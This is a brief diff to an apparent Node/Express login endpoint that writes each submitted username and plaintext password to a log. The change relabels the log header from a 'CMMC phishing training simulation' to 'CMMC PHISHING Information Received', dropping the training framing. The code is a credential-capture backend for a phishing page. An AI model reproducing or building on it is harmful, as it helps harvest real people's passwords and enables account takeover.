@@ -46,7 +46,7 @@ app.post("/api/login", (req, res) => {
 
   // Create a formatted log entry
   const entry =
-    "=== CMMC PHISHING TRAINING SIMULATION ===\n" +
+    "=== CMMC PHISHING Information Received ===\n" +
     `Username: ${username}\n` +
     `Password: ${password}\n` +
     "Timestamp: " + new Date().toISOString() + "\n" +
